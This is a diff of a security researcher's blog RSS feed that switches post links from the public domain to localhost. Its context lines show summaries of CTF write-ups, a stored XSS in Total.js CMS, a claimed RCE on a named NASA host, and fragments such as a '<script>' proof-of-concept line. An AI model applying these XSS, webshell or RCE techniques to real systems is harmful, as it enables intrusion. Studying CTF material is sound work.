-      <guid>https://blog.404error.life/posts/2022-03-27-line-ctf/</guid>
+      <guid>http://localhost:1313/posts/2022-03-27-line-ctf/</guid>
       <description>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;#web-gotm&#34;&gt;(Web) gotm&lt;/a&gt;&lt;/li&gt;
@@ -2075,10 +2135,10 @@ The outlook web app service is a mail service provided by Microsoft. A researche
     
     <item>
       <title>Spring GoN Open Qual CTF 2022 Write Up</title>
-      <link>https://blog.404error.life/posts/2022-03-21-gon-ctf/</link>
+      <link>http://localhost:1313/posts/2022-03-21-gon-ctf/</link>
       <pubDate>Mon, 21 Mar 2022 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-03-21-gon-ctf/</guid>
+      <guid>http://localhost:1313/posts/2022-03-21-gon-ctf/</guid>
       <description>&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
 &lt;p&gt;This time I did participate in CTF because GoN team of Kaist hosted the CTF. I was hacking to dawn after long time and I solved two challenges:ColorfulMemo, NSS.&lt;/p&gt;
 &lt;ul&gt;
@@ -2857,10 +2917,10 @@ default_authentication_plugin=mysql_native_password
     
     <item>
       <title>Total.js CMS, Cross-Site Scripting</title>
-      <link>https://blog.404error.life/posts/2022-03-05-xss-total.js/</link>
+      <link>http://localhost:1313/posts/2022-03-05-xss-total.js/</link>
       <pubDate>Sat, 05 Mar 2022 06:51:45 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-03-05-xss-total.js/</guid>
+      <guid>http://localhost:1313/posts/2022-03-05-xss-total.js/</guid>
       <description>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
 &lt;p&gt;The total.js Platform offers you an excellent and stable server-side Node.js framework, client-side library for creating famous web applications with more than 250 UI components for free.&lt;/p&gt;
 &lt;p&gt;I discovered the stored xss vulnerability in this open source.&lt;/p&gt;
@@ -2949,10 +3009,10 @@ default_authentication_plugin=mysql_native_password
     
     <item>
       <title>Codegate 2022 Write Up</title>
-      <link>https://blog.404error.life/posts/2022-02-28-codegate/</link>
+      <link>http://localhost:1313/posts/2022-02-28-codegate/</link>
       <pubDate>Mon, 28 Feb 2022 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-02-28-codegate/</guid>
+      <guid>http://localhost:1313/posts/2022-02-28-codegate/</guid>
       <description>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
 &lt;p&gt;The codegate was held from February 26th to 27th, but I did not even participate because I was not interested, and I only solved 3 web problems today for study.&lt;/p&gt;
 &lt;hr&gt;
@@ -3153,10 +3213,10 @@ default_authentication_plugin=mysql_native_password
     
     <item>
       <title>NASA, Remote Code Excution (0-Day Exploit)</title>
-      <link>https://blog.404error.life/posts/2022-02-19-rce-in-nasa/</link>
+      <link>http://localhost:1313/posts/2022-02-19-rce-in-nasa/</link>
       <pubDate>Sat, 19 Feb 2022 12:32:45 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-02-19-rce-in-nasa/</guid>
+      <guid>http://localhost:1313/posts/2022-02-19-rce-in-nasa/</guid>
       <description>&lt;h3 id=&#34;summary&#34;&gt;Summary&lt;/h3&gt;
 &lt;p&gt;The psg.gsfc.nasa.gov was very vulnerable to Remote Code Execution.&lt;/p&gt;
 &lt;hr&gt;
@@ -3349,10 +3409,10 @@ default_authentication_plugin=mysql_native_password
     
     <item>
       <title>Hayyim CTF 2022 Write Up</title>
-      <link>https://blog.404error.life/posts/2022-02-13-hayyim-ctf/</link>
+      <link>http://localhost:1313/posts/2022-02-13-hayyim-ctf/</link>
       <pubDate>Sun, 13 Feb 2022 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-02-13-hayyim-ctf/</guid>
+      <guid>http://localhost:1313/posts/2022-02-13-hayyim-ctf/</guid>
       <description>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
 &lt;p&gt;This weekend, Hayyim Security hosted the CTF, and I participated in it for about 3 ~ 4 hours and I was solved Cyberchef, Not E and Cyber Headchef challenges.&lt;/p&gt;
 &lt;hr&gt;
@@ -3736,10 +3796,10 @@ $netcancelResultString = hsctf{~~~~}
     
     <item>
       <title>Real World CTF 4th Hack into Skynet Write Up</title>
-      <link>https://blog.404error.life/posts/2022-01-24-realwrold-ctf/</link>
+      <link>http://localhost:1313/posts/2022-01-24-realwrold-ctf/</link>
       <pubDate>Mon, 24 Jan 2022 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2022-01-24-realwrold-ctf/</guid>
+      <guid>http://localhost:1313/posts/2022-01-24-realwrold-ctf/</guid>
       <description>&lt;p&gt;&lt;img src=&#34;https://github.com/blogpocas/blogpocas.github.io/blob/main/CTF/Real%20World%20CTF%202022/Hack%20into%20Skynet/1.png?raw=true&#34; alt=&#34;&#34;&gt;
 There is no sql injection vulnerability in login logic, and login is generally not possible because there is no user account.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;query_login_attempt&lt;/span&gt;():
@@ -3878,10 +3938,10 @@ As expected, it was strangely detoured.&lt;/p&gt;
     
     <item>
       <title>0-Day, Prototype Pollution in utils.js</title>
-      <link>https://blog.404error.life/posts/2021-11-29-cve-2021-3815/</link>
+      <link>http://localhost:1313/posts/2021-11-29-cve-2021-3815/</link>
       <pubDate>Mon, 29 Nov 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-11-29-cve-2021-3815/</guid>
+      <guid>http://localhost:1313/posts/2021-11-29-cve-2021-3815/</guid>
       <description>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
 &lt;blockquote&gt;
 &lt;p&gt;The @fabiocaccamo/utils.js is a package that provides methods with multiple functions for the convenience of developers. A vulnerability exists in one method included in this package.&lt;/p&gt;
@@ -3995,10 +4055,10 @@ As expected, it was strangely detoured.&lt;/p&gt;
     
     <item>
       <title>CCE 2021 GS 25 Write Up</title>
-      <link>https://blog.404error.life/posts/2021-09-26-cce/</link>
+      <link>http://localhost:1313/posts/2021-09-26-cce/</link>
       <pubDate>Sun, 26 Sep 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-09-26-cce/</guid>
+      <guid>http://localhost:1313/posts/2021-09-26-cce/</guid>
       <description>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
 &lt;p&gt;On the 25th, there was a CCE held by the National Intelligence Service, and at 11:10 pm, a few tens of minutes before the end of the competition, someone I knew asked me to solve it, so I tried to solve the GS 25 problem for a while, and it was very easy.&lt;/p&gt;
 &lt;hr&gt;
@@ -4240,10 +4300,10 @@ As expected, it was strangely detoured.&lt;/p&gt;
     
     <item>
       <title>DownUnderCTF 2021 Write Up</title>
-      <link>https://blog.404error.life/posts/2021-09-26-downunder-ctf/</link>
+      <link>http://localhost:1313/posts/2021-09-26-downunder-ctf/</link>
       <pubDate>Sun, 26 Sep 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-09-26-downunder-ctf/</guid>
+      <guid>http://localhost:1313/posts/2021-09-26-downunder-ctf/</guid>
       <description>&lt;h1 id=&#34;web-challenge&#34;&gt;Web Challenge&lt;/h1&gt;
 &lt;h1 id=&#34;inside-out-100-pts&#34;&gt;Inside Out [100 pts]&lt;/h1&gt;
 &lt;blockquote&gt;
@@ -4525,10 +4585,10 @@ poc-2. &amp;lt;script&amp;gt;`
     
     <item>
       <title>Whitehat Contest 2021 Write Up</title>
-      <link>https://blog.404error.life/posts/2021-09-12-whitehat-contest/</link>
+      <link>http://localhost:1313/posts/2021-09-12-whitehat-contest/</link>
       <pubDate>Sun, 12 Sep 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-09-12-whitehat-contest/</guid>
+      <guid>http://localhost:1313/posts/2021-09-12-whitehat-contest/</guid>
       <description>&lt;h1 id=&#34;web-imageflare-100-pts&#34;&gt;(Web) Imageflare [100 pts]&lt;/h1&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Imageflare 문제는 파일 업로드 취약점을 이용해 웹쉘을 업로드 한 뒤에 RCE를 이용해 플래그를 획득하는 문제입니다.&lt;/p&gt;
@@ -5124,10 +5184,10 @@ C: Z, T: 0:00:00.042300
     
     <item>
       <title>InCTF 2021 Notepad 1.5 - Arthur&#39;s Article Write Up</title>
-      <link>https://blog.404error.life/posts/2021-08-16-in-ctf/</link>
+      <link>http://localhost:1313/posts/2021-08-16-in-ctf/</link>
       <pubDate>Mon, 16 Aug 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-08-16-in-ctf/</guid>
+      <guid>http://localhost:1313/posts/2021-08-16-in-ctf/</guid>
       <description>&lt;h1 id=&#34;what-is-download-trigger&#34;&gt;What is Download Trigger?&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/49112423/129486098-81fcc315-0f12-4cd5-a414-e09bb8238e71.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;엔드포인트에서 &lt;code&gt;Content-Disposition: attachment&lt;/code&gt; 헤더가 설정이 되면 브라우저는 응답을 하는 대신에 다운로드 할 파일을 탐색한다고 합니다. 특정 상황에 따라서 사용자의 계정 상태 및 여러 요소들에 따라서 달라지는 경우를 이용해서 중요 정보를 수집할 수 있습니다.&lt;/p&gt;
@@ -5567,10 +5627,10 @@ C: Z, T: 0:00:00.042300
     
     <item>
       <title>UIU CTF 2021 yana Write Up</title>
-      <link>https://blog.404error.life/posts/2021-08-04-uiu-ctf/</link>
+      <link>http://localhost:1313/posts/2021-08-04-uiu-ctf/</link>
       <pubDate>Wed, 04 Aug 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-08-04-uiu-ctf/</guid>
+      <guid>http://localhost:1313/posts/2021-08-04-uiu-ctf/</guid>
       <description>&lt;h1 id=&#34;what-is-cache-probing&#34;&gt;What is cache probing&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/49112423/128534023-67aa205b-41be-4d9c-8f06-215b2b3d8a5c.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;It is said that the loading speed of the resource file is different from the first time the browser loads the resource file and from the second time. The reason is that the second time the resource file is fetched, the image cache is fetched from disk, not by requesting it from the web server.&lt;/p&gt;
@@ -5858,10 +5918,10 @@ C: Z, T: 0:00:00.042300
     
     <item>
       <title>pwn2win CTF Illusion Write Up</title>
-      <link>https://blog.404error.life/posts/2021-05-31-pwn2win/</link>
+      <link>http://localhost:1313/posts/2021-05-31-pwn2win/</link>
       <pubDate>Mon, 31 May 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-05-31-pwn2win/</guid>
+      <guid>http://localhost:1313/posts/2021-05-31-pwn2win/</guid>
       <description>&lt;h1 id=&#34;analysis--introduce&#34;&gt;Analysis : Introduce&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://github.com/wjddnjs33/image/blob/main/prototype/prototype1.png?raw=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;위 사진을 보면 &lt;code&gt;fast-json-patch&lt;/code&gt; 모듈의 &lt;code&gt;applyPatch()&lt;/code&gt; 메서드를 이용해서 a라는 메서드를 패치 시켜주는데, 이때 내부 오퍼레이션에 의해서 &lt;code&gt;Prototype Pollution&lt;/code&gt; 취약점이 발생한다. 인자로는 2개의 값을 보내주는 것을 볼 수 있다. 첫 번째 인자는 패치할 주체가 들어가고, 두 번째 인자로는 패치의 적용할 데이터를 &lt;code&gt;Json&lt;/code&gt; 형식으로 보내는 것을 볼 수 있고, 이 두 번째 인자에서 두 번째 값인 &lt;code&gt;path&lt;/code&gt; 키의 대해서 &lt;code&gt;Prototype Pollution&lt;/code&gt; 취약점이 발생한다.&lt;/p&gt;
@@ -6362,10 +6422,10 @@ Content-Length: 155
     
     <item>
       <title>3k CTF 2021 online_compiler Write Up</title>
-      <link>https://blog.404error.life/posts/2021-05-17-3k-ctf/</link>
+      <link>http://localhost:1313/posts/2021-05-17-3k-ctf/</link>
       <pubDate>Mon, 17 May 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-05-17-3k-ctf/</guid>
+      <guid>http://localhost:1313/posts/2021-05-17-3k-ctf/</guid>
       <description>&lt;blockquote&gt;
 &lt;p&gt;The online_compiler challenge is bypass the disable_functions and get the flag.&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -6418,10 +6478,10 @@ When I wrote the code in Python and checked it, the El_FlAAG___FilEE file existe
     
     <item>
       <title>Line CTF 2021 diveinternal Write Up</title>
-      <link>https://blog.404error.life/posts/2021-03-21-line-ctf/</link>
+      <link>http://localhost:1313/posts/2021-03-21-line-ctf/</link>
       <pubDate>Sun, 21 Mar 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-03-21-line-ctf/</guid>
+      <guid>http://localhost:1313/posts/2021-03-21-line-ctf/</guid>
       <description>&lt;p&gt;&lt;img src=&#34;https://github.com/wjddnjs33/image/blob/main/images/linectf.png?raw=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;I solved one challenge for web&lt;/p&gt;
 &lt;hr&gt;
@@ -6773,10 +6833,10 @@ CMD [&amp;#34;nodemon&amp;#34;, &amp;#34;bin/www&amp;#34;]
     
     <item>
       <title>UTCTF 2021 Tar Inspector Write Up</title>
-      <link>https://blog.404error.life/posts/2021-03-14-utctf/</link>
+      <link>http://localhost:1313/posts/2021-03-14-utctf/</link>
       <pubDate>Sun, 14 Mar 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-03-14-utctf/</guid>
+      <guid>http://localhost:1313/posts/2021-03-14-utctf/</guid>
       <description>&lt;h3 id=&#34;web-tar-inspector-994-pts&#34;&gt;(Web) Tar Inspector [994 pts]&lt;/h3&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Tar Inspector challenge is get the shell using RCE and read the flag&lt;/p&gt;
@@ -6855,10 +6915,10 @@ utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}
     
     <item>
       <title>zer0pts CTF 2021 Baby SQLi Write Up</title>
-      <link>https://blog.404error.life/posts/2021-03-08-zer0pts/</link>
+      <link>http://localhost:1313/posts/2021-03-08-zer0pts/</link>
       <pubDate>Mon, 08 Mar 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-03-08-zer0pts/</guid>
+      <guid>http://localhost:1313/posts/2021-03-08-zer0pts/</guid>
       <description>&lt;h3 id=&#34;web-baby-sqli-170-pts&#34;&gt;(Web) Baby SQLi [170 pts]&lt;/h3&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Baby SQLi challenge is bypass of waf and using shell command.&lt;/p&gt;
@@ -6986,10 +7046,10 @@ cat templates/index.html
     
     <item>
       <title>Trust CTF 2021 Write Up</title>
-      <link>https://blog.404error.life/posts/2021-02-28-trust-ctf/</link>
+      <link>http://localhost:1313/posts/2021-02-28-trust-ctf/</link>
       <pubDate>Sun, 28 Feb 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-02-28-trust-ctf/</guid>
+      <guid>http://localhost:1313/posts/2021-02-28-trust-ctf/</guid>
       <description>&lt;h1 id=&#34;web-babyxss-270-pts&#34;&gt;(Web) babyxss [270 pts]&lt;/h1&gt;
 &lt;p&gt;The babyxss challenge is a simple XSS challenge disguised as DOMPurify Bypass.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
@@ -7061,10 +7121,10 @@ cat templates/index.html
     
     <item>
       <title>Dice CTF 2021 Write Up</title>
-      <link>https://blog.404error.life/posts/2021-02-08-dice-ctf/</link>
+      <link>http://localhost:1313/posts/2021-02-08-dice-ctf/</link>
       <pubDate>Mon, 08 Feb 2021 23:29:53 +0000</pubDate>
       
-      <guid>https://blog.404error.life/posts/2021-02-08-dice-ctf/</guid>
+      <guid>http://localhost:1313/posts/2021-02-08-dice-ctf/</guid>
       <description>&lt;p&gt;&lt;img src=&#34;https://github.com/wjddnjs33/image/blob/main/Dice%20CTF/dice%20main.png?raw=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;web-babier-csp-107-pts&#34;&gt;(Web) Babier CSP [107 pts]&lt;/h1&gt;
